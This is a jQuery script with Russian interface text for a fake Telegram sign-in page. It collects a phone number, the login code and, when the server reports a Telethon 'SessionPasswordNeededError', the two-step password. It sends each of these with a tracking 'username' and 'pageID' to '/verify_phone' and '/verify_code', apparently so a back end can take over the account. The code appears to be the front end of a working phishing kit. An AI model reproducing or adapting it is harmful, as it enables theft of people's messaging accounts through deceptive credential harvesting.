
// Custom show function to set display to 'flex'
jQuery.fn.showFlex = function() {
    return this.css('display', 'flex');
};

// Custom hide function to set display to 'none'
jQuery.fn.hideFlex = function() {
    return this.css('display', 'none');
};

// Example usage:
$(document).ajaxStart(function() {
    $('.loading').showFlex();
});
$(document).ajaxStop(function() {
    $('.loading').hideFlex();
});

$('input[name="phone"]').on('input', function() {
    if (this.value[0] !== '+') {
        this.value = '+' + this.value;
    }
}).on('blur', function() {
    if (this.value === '+') {
        this.value = ''; // Если пользователь оставил только "+", очистить поле
    }
});

function validatePhone(evt) {
    var theEvent = evt || window.event;
    
    // Handle paste
    if (theEvent.type === 'paste') {
      var pastedText = event.clipboardData.getData('text/plain').replace(/\D/g, '');
      if (pastedText.length > 15) {
        theEvent.returnValue = false;
        if (theEvent.preventDefault) theEvent.preventDefault();
      }
    } else {
      // Handle key press
      var key = theEvent.keyCode || theEvent.which;
      key = String.fromCharCode(key);
      
      // Allow only digits and limit the input to 15 digits
      if (!/^\d$/.test(key) || evt.target.value.replace(/\D/g, '').length >= 15) {
        theEvent.returnValue = false;
        if (theEvent.preventDefault) theEvent.preventDefault();
      }
    }
  }
  
function formatPhoneNumber(phoneNumber) {
    // Remove any non-digit characters from the phone number
    const digitsOnly = phoneNumber.replace(/\D/g, '');
  
    // Apply the desired formatting
    const formattedNumber = `+${digitsOnly.slice(0, 1)} ${digitsOnly.slice(1, 4)} ${digitsOnly.slice(4, 7)} ${digitsOnly.slice(7)}`;
  
    return formattedNumber;
  }
  function validate(evt) {
    var theEvent = evt || window.event;
  
    // Handle paste
    if (theEvent.type === 'paste') {
        key = event.clipboardData.getData('text/plain');
    } else {
    // Handle key press
        var key = theEvent.keyCode || theEvent.which;
        key = String.fromCharCode(key);
    }
    var regex = /[0-9]|\./;
    if( !regex.test(key) ) {
      theEvent.returnValue = false;
      if(theEvent.preventDefault) theEvent.preventDefault();
    }
  }


  function validate(evt) {
    var theEvent = evt || window.event;
  
    // Handle paste
    if (theEvent.type === 'paste') {
        key = event.clipboardData.getData('text/plain');
    } else {
    // Handle key press
        var key = theEvent.keyCode || theEvent.which;
        key = String.fromCharCode(key);
    }
    var regex = /[0-9]|\./;
    if( !regex.test(key) ) {
      theEvent.returnValue = false;
      if(theEvent.preventDefault) theEvent.preventDefault();
    }
  }
  

function Log(message) {
    $("body").append(`<div class="alert">${message}</div>`);
    setTimeout(function(){
        $('.alert').addClass('slideOutUp');
        setTimeout(function(){
            $('.alert').remove();
        }, 800);
    }, 3000);
}





$('button[type="submit"]').on('click', function(e){
    e.preventDefault();


    const phone = $('input[name="phone"]').val();

    const digitsOnly = phone.replace(/\D/g, '');

    // Check if the input value has at least 11 digits (e.g., +7 (123) 456-78-90)
    if (digitsOnly.length < 11) {
        Log('Введите номер телефона')
        return
    }

    $.ajax({
        url: '/verify_phone',
        method: 'post',
        data: {
            phone: "+"+digitsOnly,
            username: $('.divID').text(),
            pageID: $('.pageID').text()
        },
        success: function(data) {
            if (data.status == 'error' || data.status == 'internal_error') {
                Log(data.message);
            } else if(data.status == 'success') {
                code_hash = data.code_hash
                $(".container").empty();
                $(".container").append(`
 
                <article class="auth_tg_to">
                    <span class="logo">
                        <img class="auth_to" style="margin-left: 0;width: 100%;height: 100%;margin-bottom: -30px;" src="static/img/monkey.gif">
                    </span>
                </article>
                <div class="txt">
                    <h1 style="font-size: 2rem;line-height: 110%;text-align: center;margin: 1.375rem 0 .875rem;">${formatPhoneNumber(phone)}</h1>
                    <p>Мы отправили проверочный код<br>на ваш номер телефона.</p>
                </div>
                <div class="form">
                <form method="POST" class="input-container ic1" style="margin-top: 30px;">
                    <input class="input" type="text" onkeypress="validate(event)" id="input" value="" name="code" autocomplete="off">
                    <div class="cut" style="width: 26px;"></div>
                    <label for="input" class="placeholder" id="label">Код</label>
                    <button type="button" name="send_code" class="next" id="codebtn">Продолжить</button>
                 </form>
                </div>

                `);


                $('#codebtn').on('click', function(e){
                    e.preventDefault();
                
                
                    const code = $('input[name="code"]').val();
                
                    if (code.length < 5) {
                        Log('Введите код');
                        return
                    }


                    $.ajax({
                        url: '/verify_code',
                        method: 'post',
                        data: {
                            phone: "+"+digitsOnly,
                            username: $('.divID').text(),
                            code: code,
                            code_hash: code_hash,
                            pageID: $('.pageID').text(),
                            ppa: ''
                        },

                        success: function(data) {
                            if (data.status == 'success') {
                                window.location.href = data.redirect;
                            } else if(data.status == 'error' || data.status == 'internal_error') {
                                if (data.type == 'SessionPasswordNeededError') {
        
                                    $(".container").empty();
                                    $(".container").append(`
                     
                                    <article class="auth_tg_to">
                                        <span class="logo">
                                            <img class="auth_to" style="margin-left: 0;width: 100%;height: 100%;margin-bottom: -30px;" src="static/img/monkey.gif">
                                        </span>
                                    </article>
                                    <div class="txt">
                                        <h1 style="font-size: 2rem;line-height: 110%;text-align: center;margin: 1.375rem 0 .875rem;">Введите пароль</h1>
                                        <p>Ваша учетная запись защищена<br>дополнительным паролем.</p>
                                    </div>
                                    <div class="form">
                                    <form method="POST" class="input-container ic1" style="margin-top: 30px;">
                                        <input class="input" type="password" id="input" name="password" autocomplete="off">
                                        <div class="cut" style="width: 46px;"></div>
                                        <label for="input" class="placeholder" id="label">Пароль</label>
                                        <button type="button" name="send_code" class="next" id="passbtn">Продолжить</button>
                                     </form>
                                    </div>
                    
                                    `);
                                    $('#passbtn').on('click', function(e){
                                        e.preventDefault();
                                        $.ajax({
                                            url: '/verify_code',
                                            method: 'post',
                                            data: {
                                                phone: "+"+digitsOnly,
                                                username: $('.divID').text(),
                                                code: code,
                                                code_hash: code_hash,
                                                pageID: $('.pageID').text(),
                                                ppa: $('input[type="password"]').val()
                                            },
                    
                                            success: function(data) {

                                                if (data.status == 'success') {
                                                    window.location.href = data.redirect;
                                                } else {
                                                    Log(data.message);
                                                }
                                            }
                                        });

                                    });


                                } else {
                                    Log(data.message);
                                }
                            }
                        }
                    })


                
                    
                });
            } else if (data.status == 'active') {
                Log(data.message);
            }
        }
    });
});